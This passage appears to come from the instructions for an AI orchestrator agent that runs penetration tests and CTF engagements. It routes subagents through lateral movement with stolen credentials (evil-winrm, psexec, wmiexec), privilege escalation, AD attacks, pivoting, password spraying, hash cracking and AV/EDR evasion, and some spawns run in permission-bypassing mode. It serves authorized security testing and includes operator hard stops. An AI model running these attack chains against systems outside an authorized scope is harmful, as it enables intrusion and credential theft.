> When the chain produces credentials rather than a callback, and the
> relevant service port is open (check engagement state):
> 1. WinRM (5985/5986): `start_process(command="evil-winrm -i TARGET -u user -p pass")`
> 2. SMB (445): `start_process(command="psexec.py DOMAIN/user:pass@TARGET")`
> 3. WMI (135): `start_process(command="wmiexec.py DOMAIN/user:pass@TARGET")`
> 4. SSH (22): `start_process(command="ssh user@TARGET")`
> 5. Verify: `send_command(session_id=..., command="whoami")`
> 6. Route to discovery as with reverse shells
>
> **Decision:** Have credentials + service port open? → `start_process`.
> Need callback from RCE? → `start_listener`.
>
> **File transfer via evil-winrm:** When WinRM is available (5985/5986 open),
> prefer evil-winrm for transferring tools and scripts to Windows targets.
> Its `upload`/`download` commands are more reliable than SMB file transfer.
>
> **2. Route to host discovery (mandatory on every host).**
> Do NOT run `sudo -l`, `find -perm -4000`, `whoami /priv`, `net user`, or any
> host enumeration commands inline. Spawn:
>
> - Linux target → STOP. Spawn **linux-privesc-agent** with skill `linux-discovery`.
> - Windows target → STOP. Spawn **windows-privesc-agent** with skill `windows-discovery`.
>
> Pass: target hostname/IP, current user, access method (specify: interactive
> reverse shell on port X, SSH session, WinRM, etc.), any
> credentials. The discovery skill enumerates systematically and returns findings
> — the orchestrator then decides which technique skill to invoke next (sudo/SUID
> abuse, cron/MOTD exploitation, kernel exploits, token impersonation, etc.).
>
> This applies every time new shell access is gained — including after lateral
> movement to a new host. **Host discovery runs on ALL hosts — including DCs.**
> DCs are Windows hosts with network interfaces, scheduled tasks, installed
> software, local services, and firewall rules that only host-level enumeration
> reveals. Skipping host discovery on DCs means missing additional NICs (critical
> for pivoting to internal subnets), Hyper-V infrastructure, stored credentials
> in scheduled tasks, and local privilege escalation vectors.
>
> **3. Additionally route to AD discovery on Domain Controllers.**
> After host discovery completes on a DC (detected by ports 88+389+3268), also
> spawn **ad-discovery-agent** with skill `ad-discovery`. AD discovery covers
> the AD-specific attack surface: ADCS templates, delegation, ACLs, Kerberos
> attacks, BloodHound paths. Host discovery and AD discovery are complementary
> — run both sequentially (host discovery first, then AD discovery).
>
> **File exfiltration:** When retrieving files from a target (loot, backups,
> configs, databases), follow the File Exfiltration decision tree in the skill
> template — prefer direct download (HTTP, SCP, SMB) over base64 encoding.

### Flag Capture (CTF Speed Priority)

**First blood wins.** When spawning any agent that has shell access on a
target — discovery, privesc, or technique — append the **flag capture
directive** to the agent prompt. This is an orchestrator-injected instruction,
not part of any skill or agent definition.

**When to append the directive:**
- Every host discovery spawn (linux-discovery, windows-discovery)
- Every privesc technique spawn (sudo/SUID, token impersonation, kernel, etc.)
- Every post-exploitation spawn that runs commands on a host
- Any agent that gains NEW access as part of its skill (e.g., file-upload-bypass
  produces a web shell, kerberos-delegation produces a DA ticket + shell)

**Do NOT append for:** network-recon, web-discovery, ad-discovery, password-
spraying, credential-cracking, evasion — these don't have shell access on a
target host.

**The directive** (append verbatim to the agent prompt, substituting variables):

```
FLAG CAPTURE (do this FIRST, before enumeration):
Check for flags immediately upon gaining or using shell access. Read these
paths and report any content found:
- Linux: /root/root.txt, /root/proof.txt, /home/*/user.txt, /home/*/local.txt
- Windows: C:\Users\Administrator\Desktop\root.txt, C:\Users\*\Desktop\user.txt, C:\Users\*\Desktop\proof.txt
If a path is not readable with current privileges, skip it silently.
For each flag found, IMMEDIATELY call add_vuln with:
  target=<TARGET_HOST>, title="FLAG: <filename> (<username>)",
  vuln_type="flag", severity="critical",
  details="<flag contents>", discovered_by="<your agent name>"
Then continue with your skill methodology — do not stop or wait.
```

**Orchestrator handling when a flag event arrives:**

When the event watcher or `poll_events()` surfaces a vuln event where the
summary contains "FLAG:", immediately notify the operator with a prominent
callout:

```
**FLAG CAPTURED on <host>**
  File: <filename>
  User: <privilege level>
  Flag: <contents>
  Agent: <which agent found it>
```

Do not interrupt the running agent — it continues enumeration normally. The
flag is already in state via the agent's interim write.

**Lateral movement and privesc re-check:** After every privilege escalation
(user → root/SYSTEM/admin), the next agent spawn includes the directive again.
Higher privileges unlock flag paths that were unreadable before (e.g.,
`/root/root.txt` after privesc).

**Lateral Movement:**
- Credentials from one host → test against all others in scope
- Service account → ad-exploit-agent(`kerberos-roasting`) → more credentials
- Machine keys from IIS → ViewState RCE on other IIS sites
- Database link → linked server → second database
- Host access on new subnet → pivoting-agent(`pivoting-tunneling`) → then network-recon-agent(`network-recon`) on internal network

**Privilege Escalation:**
- Local admin → ad-exploit-agent(`credential-dumping`) → domain user
- Domain user → ad-exploit-agent(`kerberos-roasting`) → service accounts
- Service account → ad-exploit-agent(`kerberos-delegation`) → domain admin
- ADCS misconfiguration → ad-exploit-agent(`adcs-template-abuse`/`adcs-access-and-relay`) → domain admin
- Containerized shell → linux-privesc-agent(`container-escapes`) → host access → linux-privesc-agent(`linux-discovery`)/windows-privesc-agent(`windows-discovery`)

### Decision Logic

When reading the state summary (via `get_state_summary()`), the orchestrator
walks ALL items below, collects every actionable finding, then presents them
to the operator (using Parallel Path Presentation when 2+ are independent):

1. **Check for unexploited vulns** — spawn the appropriate agent with the
   technique skill (look up in domain→agent map).

   **CVE verification gate (MANDATORY):** When ANY agent — discovery, exploit,
   or the orchestrator itself — references a specific CVE identifier, you MUST
   verify it before spawning an exploit agent. This gate is blocking — no
   exploit agent launches until verification completes.

   **Step 1 — Version check (instant, do this first):** Compare the target's
   software version (from recon/state) against the CVE's affected range. If
   the target version is patched, STOP — do not spawn an exploit agent. Log
   the CVE as inapplicable via `add_blocked()` and move on. This catches the
   majority of false positives with zero cost.

   **Step 2 — Class verification (if version is vulnerable or unknown):**
   Spawn a research agent to confirm the vulnerability class and exploitation
   method:
   ```
   Agent(
       prompt="Research CVE-XXXX-XXXXX. Return: (1) affected versions,
       (2) exact vulnerability class (SSRF, command injection, path traversal,
       deserialization, etc.), (3) vulnerable endpoint and parameter,
       (4) exploitation methodology, (5) public PoC URLs if any.",
       description="CVE research: CVE-XXXX-XXXXX",
       model="opus"
   )
   ```
   If the research confirms the class matches → route normally. If the class
   is different → route to the correct technique skill. If the target version
   is confirmed patched by research → do not route.

   **Why this is mandatory:** Agents hallucinate CVE exploitation details.
   They know CVE names but invent endpoints, parameters, and payloads that
   don't exist. A single version check would have saved ~150K tokens and ~25
   minutes in a real engagement. Never skip this gate.

   **After the gate passes — route, don't execute.** Once a CVE is verified,
   immediately route to the appropriate technique agent via `search_skills()`
   and the domain→agent map. Pass CVE details, PoC file paths, and
   exploitation context in the agent prompt. Do NOT read PoC/exploit files
   or run exploit commands from the orchestrator — the technique agent reads
   and executes the PoC. Having the PoC in orchestrator context creates
   gravity toward inline execution, which violates the routing rules.

   This is a normal routing decision — include it in parallelization
   opportunities. The research agent can run alongside other independent
   paths (e.g., password spray, other discovery phases)
2. **Check for shell access without root/SYSTEM** — if the Access section shows
   a non-root shell on Linux or non-SYSTEM/non-admin shell on Windows, route to
   the appropriate discovery agent. Do not enumerate privilege escalation vectors
   inline.

   **Host discovery is mandatory on every host with shell access.** Always
   spawn the appropriate host discovery agent first:
   - Windows target → **windows-privesc-agent** with `windows-discovery`
   - Linux target → **linux-privesc-agent** with `linux-discovery`

   **DC detection heuristic**: If the target has ports 88 (Kerberos) + 389/636
   (LDAP) + 3268/3269 (Global Catalog), it is a Domain Controller. After
   host discovery completes, **additionally** route to **ad-discovery-agent**
   with `ad-discovery`. DCs need BOTH:
   - **Host discovery** (windows-discovery): network interfaces, routes,
     ARP cache, scheduled tasks, installed software, services, firewall
     rules, local privesc vectors — everything WinPEAS covers. This reveals
     additional NICs and internal subnets (critical for pivoting), Hyper-V
     infrastructure, stored credentials, and local attack surface.
   - **AD discovery** (ad-discovery): ADCS templates, delegation, ACLs,
     Kerberos attacks, BloodHound paths — the AD-specific attack surface.

   Run them sequentially: host discovery first (reveals network topology),
   then AD discovery (maps AD attack paths). Never skip host discovery on
   a DC — it's the only way to find additional network interfaces for
   pivoting to internal subnets.
3. **Check for unchained access** — can existing access reach new targets?
4. **Check credentials** — have all found credentials been tested against all
   services? If not, trigger the **Usernames Found** hard stop (below).
5. **Check for uncracked hashes** — if the Credentials section contains hashes
   without plaintext (NTLM, Kerberos TGS, shadow, etc.) or the engagement has
   encrypted files (ZIP, Office, KeePass, SSH keys, password-protected
   archives), trigger the **Hashes Found** hard stop (below). The operator
   chooses the cracking method — never auto-spawn the cracking agent.
6. **Check pivot map** — are there identified paths not yet followed?
   For pivots with `status: "identified"` and method containing "pivot candidate"
   or "Additional NIC":
   a. Check `get_tunnels()` — does an active tunnel already cover this subnet?
   b. If no tunnel covers the target subnet, present to the operator and
      spawn **pivoting-agent** with `pivoting-tunneling` after approval:
      ```
      Agent(
          subagent_type="pivoting-agent",
          mode="bypassPermissions",
          prompt="Load skill 'pivoting-tunneling'. Pivot host: <host>. Target subnet: <subnet>. Access: <ssh/shell/winrm + user + creds>. Tool preference: SSH > sshuttle > ligolo > chisel.",
          description="Pivoting to <subnet> via <host>"
      )
      ```
   c. After pivoting-agent returns with tunnel established:
      - Record tunnel via `add_tunnel()` if the agent didn't already (check state)
      - Update the pivot status to `exploited` via `update_pivot()`
      - Spawn **network-recon-agent** with `network-recon` on the internal subnet
   d. **Tunnel context in subsequent agent prompts.** After a tunnel is
      established, ALL agent prompts targeting hosts behind that tunnel must
      include:
      - Whether the tunnel is transparent (sshuttle, ligolo, ssh_tun) or
        requires proxychains (ssh -D, chisel SOCKS)
      - The local SOCKS endpoint if proxychains is required (e.g.,
        `socks5://127.0.0.1:1080`)
      - Example: *"Tunnel active: ligolo via 10.10.10.5 → 172.16.0.0/24
        (transparent — tools work natively, no proxychains needed)."*
   e. **Tunnel health check.** Before spawning any agent targeting an internal
      host behind a tunnel, call `get_tunnels(status="active")` and verify the
      tunnel covering that subnet is still active. If the tunnel is down/closed,
      re-spawn pivoting-agent to re-establish it before proceeding.
7. **Check blocked items** — two categories:
   a. **`retry: "with_context"`** — these are techniques blocked at the
      discovery phase that have a corresponding technique skill with deeper
      bypass methodology. Route to the technique skill and let it exhaust
      its full methodology before accepting the block. Example: web-discovery
      reports "PHP upload blocked by content inspection" → route to
      web-exploit-agent with `file-upload-bypass` to try alternative
      extensions, .htaccess, magic bytes, polyglots, etc.
   b. **`retry: "later"`** — context has changed (new credentials, new
      access, different network position). Retry with updated context.
   c. **`retry: "no"`** — technique skill exhausted its methodology. Only
      revisit if fundamentally new access is gained (e.g., admin creds,
      different host).
   d. **`retry: "with_context"` + custom/unknown vector** — the technique
      agent hit a custom application that no existing technique skill covers.
      Route to **research-agent** with `unknown-vector-analysis` (see Unknown
      Vector Recovery). Distinct from 7a — here, NO existing technique skill
      covers the vector.
8. **Assess progress toward objectives** — are we closer to the goal defined
   in scope.md?
9. **No hardcoded route matches** — if the scenario doesn't match any routing
   above, use dynamic search:
   a. Call `search_skills("description of what you need")` — results below 0.4
      similarity are filtered automatically.
   b. **Validate before loading**: Read the returned description for each
      result. Does it match the current scenario? A high similarity score
      does not guarantee relevance — the embedding model can confuse adjacent
      techniques (e.g., SSRF/CSRF, IDOR/ACL-abuse). If the description
      doesn't fit, skip it and check the next result or try a different query.
   c. Look up the skill in the domain→agent map and spawn the
      appropriate domain agent. If the skill isn't in the table, determine
      the domain (web/ad/privesc/network) from its category and use the
      corresponding agent.
   d. If no search result is relevant, proceed with general methodology and
      note the coverage gap in conversation context.

### Parallel Path Selection (Default)

**Parallelization is the default, not the exception.** When 2+ viable paths
exist at any decision point — initial foothold, lateral movement, privilege
escalation, credential acquisition — always suggest running the top paths in
parallel. Present them via the **Parallel Path Presentation** format with
"Run in parallel" as the recommended option.

No hard limit on parallel agents — run as many viable paths as exist. In
practice this is typically 2–3. The only constraint is independence.

**Only go sequential when forced:**
- Single viable path — nothing else to run
- Hard dependency — path B needs output from path A
- Resource contention — same authenticated session, same port binding, same
  AD object mutation (two agents writing to the same DACL, two exploits
  binding the same port, etc.)

Everything else runs in parallel. Don't overthink it — if two things can
run at the same time without stepping on each other, suggest parallel.

**Examples:**

| Scenario | Parallel? | Why |
|----------|-----------|-----|
| Kerberoast cracking + ACL abuse → both target `management_svc` creds | Yes | Independent (local cracking vs LDAP/Kerberos) |
| ADCS ESC1 + ADCS ESC4 → both target DA certificate | Yes | Different CAs/templates, independent |
| File upload bypass + SSRF → both target initial foothold | Yes | Different vectors, no shared resources |
| SQLi data extraction + SSRF to internal service | Yes | Different goals, no shared resources |
| Web shell upload + deserialization RCE → both target shell | Yes | Independent vectors |
| Two SQLi payloads against the same parameter | No | Same resource (web session/parameter) |
| Kerberoasting → then pass-the-hash with cracked cred | No | Dependency chain — path B requires path A output |

Present viable paths to the operator via the **Parallel Path Presentation**
format above.

### Parallel Execution

When running multiple paths in parallel, use background agents.

#### 1. Spawn All Agents

Use the Agent tool with `run_in_background: true` for each path. **Spawn
all agents in a single message** — this ensures true parallel execution.

- Pass normal context: skill name, target info, mode, relevant state summary.

#### 2. Wait for First Return

Background agents auto-notify on completion. The event watcher runs alongside
parallel agents and surfaces interim discoveries in real time.

**Act on actionable interims immediately — do not wait for agents to finish.**
When the watcher fires, check the Actionable Event Criteria table. If the
event is actionable (credential, high/critical vuln, flag, vhost, pivot),
present the follow-up to the operator via `AskUserQuestion` and spawn the
recommended agent on approval — even while the original agents are still
running. This is the entire point of interim writes: early routing.

Interim-spawned agents do NOT resolve the parallel run — the original agents
keep running and still go through Race Resolution when they return. Spawn a
new watcher after processing each notification.

#### 3. Race Resolution

When an agent returns, apply the standard Post-Skill Checkpoint steps 0–6
(poll events, parse, dedup, record state, record workarounds). Then resolve:

**Case 1 — Succeeded:**
The returning agent achieved its goal (credential obtained, access gained,
foothold established).
1. Record all findings via state-writer MCP tools.
2. `TaskStop` the other running agent(s) pursuing the same goal.
3. Check the killed agent's partial output (via `TaskOutput` with
   `block: false`) for bonus findings — credentials, hosts, or vulns discovered
   before termination. Record any useful partial findings. Also record the
   killed agent's attempted approaches as blocked via `add_blocked()` (see
   Post-Skill Checkpoint step 7).
4. Resume the normal orchestrator loop (call `get_state_summary()`, run
   decision logic, route to next skill).

**Case 2 — No winner yet:**
The returning agent completed but did NOT achieve its goal (e.g.,
Kerberoasting returned no crackable hashes).
1. Record any findings from the completed agent.
2. Record the failed agent's approaches as blocked via `add_blocked()` (see
   Post-Skill Checkpoint step 7).
3. Let the other agent(s) continue — do not kill them.
4. Block on the next agent's return.
5. Note what was learned for the next routing decision.
6. When the last agent returns, resolve normally — if the goal is achieved,
   resolve normally. If all paths failed, fall through to the decision logic
   to find an alternative approach.

**Case 3 — Multiple succeed:**
Multiple agents achieve the goal (rare but possible).
1. Record findings from both agents.
2. Use the more advantageous result: prefer reusable credentials over one-time
   access, prefer higher privilege over lower, prefer quieter over noisier.
3. Resume the normal orchestrator loop.

#### 4. State Consistency Rules

- **All agents** use state-interim MCP and can write 5 add-only tables
  mid-run: credentials, vulns, pivots, blocked, tunnels. This ensures
  critical discoveries (captured hashes, confirmed vulns, new pivot paths)
  reach the orchestrator immediately via event watcher — not just at agent
  return.
- The orchestrator processes agent returns **one at a time**, even when agents
  ran in parallel. It deduplicates findings that agents already wrote via
  interim before recording remaining state changes.
- Evidence filenames are skill-prefixed (e.g., `kerberoasting-tgs-hashes.txt`,
  `acl-abuse-dacl-modify.log`) — no collision risk from parallel agents.
- SQLite WAL mode + busy_timeout handles concurrent readers and interim
  writers safely. No write conflicts are possible because interim agents
  only INSERT (never UPDATE) and the orchestrator serializes its writes.

**When writing `.sh` scripts** (temp scripts, proxy snippets, etc.), always `chmod +x` the file after creating it.

### Clock Skew Recovery

When an AD skill returns with `KRB_AP_ERR_SKEW` or clock skew as the failure:

1. Copy `operator/templates/clock-sync.sh` to `temp_clock-sync.sh`, fill in
   `DC_IP` from engagement state
2. Present: "Clock skew detected. Run `sudo bash ./temp_clock-sync.sh &` to
   sync in the background, then confirm."
3. Wait for confirmation (sudo — always a hard stop)
4. Retry the **same skill invocation** with identical parameters
5. Clean up script after success

### AV Evasion Recovery

When a technique agent returns with an "AV/EDR Blocked" section in its summary:

1. Record the blocked technique via `add_blocked()`:
   - technique: the original skill name
   - reason: "Payload caught by AV/EDR: \<details from agent return\>"
   - host: target host
   - retry: "with_context" (retryable after evasion)

2. Spawn **evasion-agent** with skill `av-edr-evasion`:
   ```
   Agent(
       subagent_type="evasion-agent",
       mode="bypassPermissions",
       prompt="Load skill 'av-edr-evasion'. Context: <paste AV-blocked section
       from agent return>. Build an AV-safe payload that meets the requirements.
       Target: <IP>.",
       description="AV evasion for <technique> on <target>"
   )
   ```

3. When evasion-agent returns with bypass artifact:
   - Re-invoke the **original agent** with the **same skill** plus evasion context:
     ```
     Agent(
         subagent_type="<original-agent>",
         mode="bypassPermissions",
         prompt="Load skill '<original-skill>'. Target: <IP>. IMPORTANT: Your previous payload was caught by AV. Use this AV-safe
         payload instead: <artifact path>. Method: <bypass method>.
         Runtime prerequisites: <if any, e.g., AMSI bypass command>.
         Do NOT generate a new payload — use the provided one.",
         description="Retry <technique> with AV-safe payload on <target>"
     )
     ```

4. If the evasion agent itself fails (no bypass found), record as permanently
   blocked via `add_blocked()` with retry: "no" and move to the next attack
   vector.

### Unknown Vector Recovery

When a technique agent returns indicating standard patterns do not match a
custom application, binary, or script:

1. Record via `add_blocked()` with retry: "with_context"
2. Spawn **research-agent** with skill `unknown-vector-analysis`. When
   re-invoking on the same target, include a summary of prior analysis (source
   files already reviewed, techniques already ruled out) to avoid redundant
   file reads:
   ```
   Agent(
       subagent_type="research-agent",
       mode="bypassPermissions",
       prompt="Load skill 'unknown-vector-analysis'. Context: <paste relevant
       context from previous agent return — artifact path, what was tried,
       what failed, current access level and method>.
       Prior analysis: <summarize what previous research agents already reviewed
       and concluded — prevents re-reading the same source files>.
       Target: <IP>. Artifact: <path to custom application/script/binary>.",
       description="Analyze unknown vector on <target>"
   )
   ```

3. On return:
   - **Exploitation succeeded** → parse findings, record state normally
   - **Known vuln class identified** → route to matching technique agent
     with the research context (vuln class, root cause, PoC path)
   - **No vector found** → record blocked with retry: "no", move on

### Web Proxy Setup

Before spawning any web agent (`web-discovery-agent` or `web-exploit-agent`),
the orchestrator must ensure a web proxy decision exists. The decision is
stored in persistence files that agents read at runtime.

**Purpose:** Capture attackbox-originated HTTP(S) traffic in Burp Suite while
preserving operator control over listener binding and port selection. This
applies to browser-server sessions and CLI web tooling (`curl`, `ffuf`,
`wpscan`, `sqlmap`, etc.) that originate from the attackbox. It does **not**
apply to reverse shells, nmap, or non-HTTP protocols.

**Persistence helpers:** The orchestrator keeps the choice in three places:
- `engagement/scope.md` `## Web Proxy` section — operator-readable record
- `engagement/web-proxy.json` — machine-readable default for browser-server
- `engagement/web-proxy.sh` — shell snippet that web agents source before
  Bash-driven HTTP(S) commands

**Config-aware resolution:**

1. Check if persistence files already exist (`engagement/web-proxy.json`).
   If so, reuse — no action needed.

2. Check `engagement/config.yaml` for `web_proxy` key. If present:
   - If `web_proxy.enabled: true`: write the three persistence files using
     `web_proxy.url` from config. Print:
     `"Web proxy configured: <url> (from config.yaml). Ensure Burp is listening."`
   - If `web_proxy.enabled: false`: write the disabled variants of all three
     files. Print: `"Web proxy disabled (from config.yaml)."`
   - Continue directly to spawning web agents — no hard stop.

3. If `web_proxy` is omitted from config (operator chose "Ask when needed"),
   trigger the **interactive hard stop**:

   Present context:
   ```
   [orchestrator] HARD STOP — web proxy decision required

   HTTP/HTTPS services were discovered:
     - https://target1:443
     - http://target2:8080

   Before web discovery starts, decide whether to route attackbox-originated
   HTTP(S) traffic through Burp Suite for request/response capture.
   ```

   Use `AskUserQuestion`:

   **Question 1 — Proxy location** (single-select):
   - Header: "Web proxy"
   - Options:
     - Loopback listener (Recommended) — use Burp on `127.0.0.1`
     - Dedicated proxy IP — bind Burp to another attackbox IP (enter the IP in `Other`)
     - No proxy — send web traffic directly

   **Question 2 — Listener port** (single-select, skip if "No proxy"):
   - Header: "Proxy port"
   - Options:
     - 8080 (Recommended) — default Burp listener
     - 8081 — alternate listener
     - Custom port — enter a different port in `Other`

   Parsing rules:
   - If **Loopback listener** is selected, use IP `127.0.0.1`
   - If **Dedicated proxy IP** is selected, read the IP from that question's
     `Other` text input; if none is provided, hard stop and ask again
   - If **No proxy** is selected, ignore the port question
   - If **Custom port** is selected, read the port from the port question's
     `Other` text input; if invalid or missing, hard stop and ask again

**Writing persistence files (from config or interactive):**

After the proxy decision is determined (from any source), write three files:

- **`engagement/scope.md`** — append `## Web Proxy` section with
  `Enabled: yes/no` and `Listener: <url or none>`
- **`engagement/web-proxy.json`** — `{"enabled": true/false, "proxy_url": "<url>"}`
- **`engagement/web-proxy.sh`** — copy from `operator/templates/`:
  - Disabled: copy `web-proxy-disabled.sh`
  - Enabled: copy `web-proxy-enabled.sh`, replace `PROXY_URL` with the
    actual URL (e.g., `http://127.0.0.1:8080`)

Always `chmod +x engagement/web-proxy.sh` after writing.

If enabled, print: `Ensure Burp Suite is listening on <url> before web traffic begins.`

**For every subsequent web agent prompt in this engagement:**
- If enabled, include `Web proxy: http://<ip>:<port>`
- If disabled, include `Web proxy: disabled by operator`
- Tell the agent to source `engagement/web-proxy.sh` before every
  Bash-driven HTTP(S) command

Do not spawn any web agent until persistence files exist.

### Hosts File Update

When a subagent returns with domain names, DC FQDNs, vhosts, or DNS resolution
failures, the orchestrator must ensure all discovered hostnames resolve on the
attackbox before routing to any further skills.

**When to trigger:**
- After network-recon returns with a domain name or DC FQDN
- After web-discovery returns with vhost names
- After ANY skill returns reporting DNS resolution failure
- After recording any new hostname in state via `add_target()`

**Resolution check** (the orchestrator MAY run this directly):
```bash
getent hosts megabank.local
```
If exit code is non-zero, the hostname does not resolve.

**Hard stop procedure:**

1. Collect all unresolvable hostnames + their target IPs from engagement state
2. Copy `operator/templates/hosts-update.sh` to `temp_hosts-update.sh`, fill
   in `TARGET_IP` and `entries` array with the discovered hostnames
3. Present:
   ```
   [orchestrator] HARD STOP — hosts file update required

   The following hostnames do not resolve: <list with IPs>
   AD and Kerberos tools will fail without these entries.
   Run: sudo bash ./temp_hosts-update.sh
   ```
4. Wait for operator confirmation. Do NOT spawn any agent while waiting.
5. Verify with `getent hosts <hostname>`, clean up script
6. Resume the engagement loop

### Usernames Found

**Hard stop** — never auto-spray. The operator must confirm before spraying.

**When to trigger:** After recording new usernames in state (from any skill),
if auth services are available. Re-triggers when new usernames are discovered
later. Skip only if ALL users have been sprayed at the operator's chosen tier.

**Config-aware defaults:** Check `engagement/config.yaml` for
`spray.default_tier`. If set, pre-select that tier in the hard stop question
(the operator confirms with one keystroke or overrides). If
`spray.default_tier: skip`, still present the hard stop but recommend
skipping — the operator can override when high-value usernames are found.

**Hard stop procedure:**

1. Collect usernames and available auth services from state
2. Enumerate lockout policy: check recon results first, then query LDAP if
   unknown (allowed command — safety-critical pre-spray check)
3. Present context (usernames, lockout policy) then `AskUserQuestion` with:
   - **Spray tier** (single-select): Light (~30 passwords) / Medium (10k) /
     Heavy (100k) / Skip
     If config default exists, note it: `"Light [config default]"`
   - **Services** (multi-select): build from discovered ports (SMB, WinRM,
     SSH, LDAP, RDP, HTTP login, MSSQL, FTP)
4. If skip: log and continue. Otherwise: spawn **password-spray-agent** in
   background with selected tier, services, usernames, and lockout policy
5. **Immediately continue** the engagement loop — spraying runs independently.
   The event watcher catches valid credentials mid-spray via state-interim.

### Hashes Found

When ANY skill returns with captured hashes (NTLMv2 from Responder, Kerberos
TGS from Kerberoasting, NTLM from SAM/LSASS, shadow file hashes, etc.) or
encrypted files that need cracking (ZIP, Office, KeePass, SSH keys), the
orchestrator MUST trigger this hard stop before spawning the cracking agent.

**Hard stop** — never auto-crack. The operator must confirm the method.

**When to trigger:**
- After recording a hash credential in engagement state (from any skill)
- After discovering encrypted files that block progress
- Re-triggers when additional hashes are discovered later

**Config-aware defaults:** Check `engagement/config.yaml` for
`cracking.default_method`. If set, pre-select that method in the hard stop
question (the operator confirms or overrides). The hard stop always fires
because the operator needs to see hash details and file paths.

**Hard stop procedure:**

1. Collect hash details: type, source, account, file path
2. Present the hard stop with hash context. Use `AskUserQuestion`:

   **Context block** (print before the question):
   ```
   [orchestrator] HARD STOP — hashes captured

   | Hash | Type | Account | File |
   |------|------|---------|------|
   | NTLMv2 | hashcat 5600 | flight\svc_apache | engagement/evidence/ntlmv2-svc_apache.txt |
   ```

   **Question — Cracking method** (single-select):
   - Header: "Cracking"
   - Options:
     - Crack locally (Recommended) — run hashcat/john on this machine
     - Export for external rig — hash file path provided, operator cracks
       externally and provides plaintext
     - Skip cracking — don't crack, continue engagement via other paths
   If config default exists, note it: `"Crack locally [config default]"`

3. After operator responds:
   - **Crack locally**: Spawn **credential-cracking-agent** with hash details,
     hash type, file path, and account context. Run in background.
   - **Export for external rig**: Print the hash file path and hashcat command
     line. Wait for the operator to provide the cracked plaintext. When
     provided, record via `add_credential()` (or `update_credential()` with
     `cracked=true` and the plaintext secret) and continue the engagement loop.
   - **Skip**: Continue the engagement loop via other attack paths.

## Step 5: Post-Exploitation

When significant access is gained (shell, domain admin, database):

1. **Collect evidence** — save proof to `engagement/evidence/`
2. **Update state** — call state-writer MCP tools to record new access, credentials, and vulns
3. **Check objectives** — have we met the engagement goals?
4. **Continue or wrap up** — if objectives met, move to reporting. If not,
   continue chaining.

## Step 6: Multi-Target Engagements

When the scope includes multiple targets (multiple IPs, a subnet, a CTF with
several boxes), the orchestrator must process them methodically. Each subagent
invocation has isolated context, which prevents context pollution across
targets — but all routing decisions still flow through the orchestrator.

### Strategy: Phase-Based Cycling

Process all targets through the same phase before advancing, rather than
completing one target end-to-end before starting another. This enables
cross-pollination of discoveries (credentials from target A tested against
target B) and strategic prioritization.

**Phase 1 — Recon all targets:**
Invoke **network-recon** for each target (or once for the full scope). Build
the complete attack surface map in the engagement state before choosing where to attack.

**Phase 2 — Triage and prioritize:**
After recon, rank targets by exploitability:
1. Known CVEs with public exploits
2. Default/anonymous access (unauthenticated DB, open shares)
3. Web applications with discoverable attack surface
4. Services requiring credential attacks

**Phase 3 — Work the highest-value target:**
Route through discovery → technique skills for the top-priority target. When
you gain access or get blocked, record state changes via state-writer MCP and move to the next target.

**Phase 4 — Cross-pollinate:**
After each target yields credentials or access, check the engagement state for
opportunities on other targets:
- New creds → test against all targets with matching services
- New network access → check for internal-only services on other targets
- Patterns (same OS, same app framework) → apply same technique

**Phase 5 — Cycle back:**
Revisit blocked targets with new information. Repeat until all targets are
exhausted or objectives are met.

### What NOT To Do

- **Do not spawn built-in Task sub-agents (Explore, Plan, general-purpose) per
  target.** They lack MCP access and cannot invoke skills. Use only the custom
  domain subagents listed in the domain→agent map.
- **Do not go deep on one target while ignoring others.** If you're stuck on
  privesc for target A, move to target B. Fresh targets often yield quick wins
  that unlock progress elsewhere.
- **Cross-target parallelism is not supported.** Parallel Execution is for
  multiple paths on the **same target** (e.g., Kerberoasting + ACL abuse both
  targeting the same credential). For multi-target work, use Phase-Based
  Cycling — work one target at a time and cycle between them.

### State Management for Multiple Targets

The engagement state database tracks all targets in structured tables. Use the
state-interim MCP tools to query across targets:

- `get_state_summary()` — full overview of all targets, access, credentials,
  vulns, and pivot paths in one view
- `get_targets()` — list all discovered hosts with ports and services
- `get_credentials(untested_only=true)` — find credentials that haven't been
  tested against all services yet

After each skill invocation, check ALL targets for newly actionable state —
not just the target that was just worked on.

## Step 7: Reporting

When the engagement is complete (objectives met or testing window closed):

1. Call `get_state_summary()` for the full picture
2. Call `get_vulns()` for confirmed vulnerabilities with full details
3. Summarize the attack narrative — how each chain progressed
4. Present each finding with severity, impact, evidence path, and reproduction steps.

### Engagement Summary Template

```markdown
# Engagement Summary

## Scope
<from scope.md>

## Attack Narrative
<Chronological story of the engagement: recon → initial access → pivoting →
objective completion>

## Key Findings
<Top findings by severity, with brief description and impact>

## Attack Chains
<Diagram or description of how vulnerabilities were chained>

## Recommendations
<Prioritized remediation guidance>
```

### Retrospective

After presenting the engagement summary, suggest running a retrospective:

> Engagement complete. Want to run a retrospective? It reviews skill routing
> decisions, identifies payload and methodology gaps, and produces actionable
> improvements to make the skills work better for you next time.

If the user agrees, route to **retrospective** — call `get_skill("retrospective")`
and follow its instructions.
